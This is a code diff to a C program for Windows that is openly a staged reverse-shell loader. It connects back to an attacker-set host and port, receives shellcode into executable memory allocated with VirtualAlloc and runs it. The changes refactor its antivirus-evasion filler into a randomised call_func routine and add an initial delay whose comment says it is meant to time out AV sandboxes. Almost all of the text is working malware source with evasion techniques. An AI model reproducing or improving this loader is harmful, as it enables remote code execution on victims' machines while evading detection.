@@ -87,17 +87,18 @@ char* scratch_fill2()
 //get the stage 2 shellcode
 int getit(SOCKET sock, char * stage1, int stage0)
 { 
-	int data = 0; 
+	int size = 0; 
 	int recieved = 0; 
 	char * startb = stage1; 
 	while (recieved < stage0) 
 	{ 
-		data = recv(sock, (char *)startb, stage0 - recieved, 0); 
-		startb += data; 
-		recieved += data; 
-		if (data == SOCKET_ERROR) 
+		size = recv(sock, (char *)startb, stage0 - recieved, 0); 
+		startb += size; 
+		recieved += size; 
+		if (size == SOCKET_ERROR) 
 			sockerror(sock); 
-	} 
+	}
+
 	return recieved; 
 }
 
@@ -132,6 +133,61 @@ SOCKET connect(char * addr, int port)
 	return sock; 
 }
 
+/* These are used for AV evasion, eating up AV sanbox time, modifying signature, etc*/
+void call_func(int run)   
+{
+	int i;
+	char * scratch1[SCRATCH_SIZE];
+	char * scratch2[SCRATCH_SIZE];
+	char * scratch3[SCRATCH_SIZE];
+	
+	switch (run)
+	{
+	case 1:
+		for (i = 0; i < SCRATCH_SIZE; ++i)
+			scratch1[i] = (char *)malloc(200 * sizeof(char));
+
+		for (i = 0; i<SCRATCH_SIZE; ++i)
+		{
+			strncpy_s(scratch1[i], 100, scratch_fill1(), 100);
+		}
+		for (i = 0; i < SCRATCH_SIZE; ++i)
+			free(scratch1[i]);
+		break;
+
+	case 2:
+		for (i = 0; i < SCRATCH_SIZE; ++i)
+			scratch2[i] = (char *)malloc(rand() % 1000 + 1000);
+
+		for (i = 0; i<SCRATCH_SIZE; ++i)
+		{
+			strncpy_s(scratch2[i], 100, scratch_fill2(), 100);
+		}
+		for (i = 0; i < SCRATCH_SIZE; ++i)
+			free(scratch2[i]);
+		break;
+
+	case 3:
+		for (i = 0; i < SCRATCH_SIZE; ++i)
+			scratch3[i] = (char *)malloc(rand() % 5000 + 1000);
+
+		for (i = 0; i < SCRATCH_SIZE; ++i)
+		{
+			strncpy_s(scratch3[i], 100, scratch_fill3(), 100);
+		}
+		for (i = 0; i < SCRATCH_SIZE; ++i)
+			free(scratch3[i]);
+		break;
+
+	case 4:
+		killit(rand() % 5000);
+		break;
+
+	default:
+		killit(rand() % 5000);
+		break;
+	}
+}
 
 int _tmain(int argc, _TCHAR* argv[])
 {
@@ -143,67 +199,38 @@ int _tmain(int argc, _TCHAR* argv[])
 	void(*stage2)();	//function pointer to execute stage 2 shellcode
 	int i;
 	
-	/* These are used for AV evasion, eating up AV sanbox time, modifying signature, etc*/
-
-	char * scratch1[SCRATCH_SIZE];
-	char * scratch2[SCRATCH_SIZE];
-	char * scratch3[SCRATCH_SIZE];
 
 	
-	
-	for (i = 0; i < SCRATCH_SIZE; ++i)						//filler
-		scratch1[i] = (char *) malloc(200 * sizeof(char));	//filler
+killit(rand() % 5000 + 1000);  //run this first to timeout any AV sandbox.
 
 	startsock();
-
-	killit(rand() % 5000);
-		
-	if (argc != 3)		//either edit stdafx.h to set LHOST:LPORT or call ./prog.exe host port
-	{
+call_func(rand() % 5 + 1);
+	if (argc != 3) {		//either edit stdafx.h to set LHOST:LPORT or call ./prog.exe host port
 		sock = connect(LHOST, LPORT);
-	} 
-	else
-	{
+	} 	else {
 		sock = connect((char *)argv[1], atoi((char *) argv[2]));
 	}
-	
-	for (i = 0; i < SCRATCH_SIZE; ++i)							//filler
-		scratch2[i] = (char *) malloc(rand() % 1000 + 1000);	//filler
-
-	int data = recv(sock, (char *)&stage0, 4, 0);
-	if (data != 4 || stage0 <= 0)
+call_func(rand() % 5 + 1);
+	int size = recv(sock, (char *)&stage0, 4, 0);
+call_func(rand() % 5 + 1);
+	if (size != 4 || stage0 <= 0)
 		sockerror(sock);
-
+call_func(rand() % 5 + 1);
 	stage1 = (char *) VirtualAlloc(0, stage0 + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-	for (i = 0; i<SCRATCH_SIZE; ++i)							//filler
-	{															//filler
-		strncpy_s(scratch1[i], 100, scratch_fill1(), 100);		//filler
-	}															//filler
-
+call_func(rand() % 5 + 1);
 	if (stage1 == NULL)
 		sockerror(sock);
-
+call_func(rand() % 5 + 1);
 	stage1[0] = 0xBF;
+call_func(rand() % 5 + 1);
 	memcpy(stage1 + 1, &sock, 4);
-	
-	for (i = 0; i < SCRATCH_SIZE; ++i)							//filler
-		scratch3[i] = (char *) malloc(rand() % 5000 + 1000);	//filler
-
-	for (i = 0; i<SCRATCH_SIZE; ++i)							//filler
-	{															//filler
-		strncpy_s(scratch2[i], 100, scratch_fill2(), 100);		//filler
-	}															//filler
-
-	data = getit(sock, stage1 + 5, stage0);
+call_func(rand() % 5 + 1);
+	size = getit(sock, stage1 + 5, stage0);
+call_func(rand() % 5 + 1);
 	stage2 = (void(*)())stage1;
+call_func(rand() % 5 + 1);
 	stage2();
-	
-	for (i = 0; i < SCRATCH_SIZE; ++i)							//filler
-	{															//filler
-		strncpy_s(scratch3[i], 100, scratch_fill3(), 100);		//filler
-	}															//filler
-
+call_func(rand() % 5 + 1);
 	return 0;
 }
 
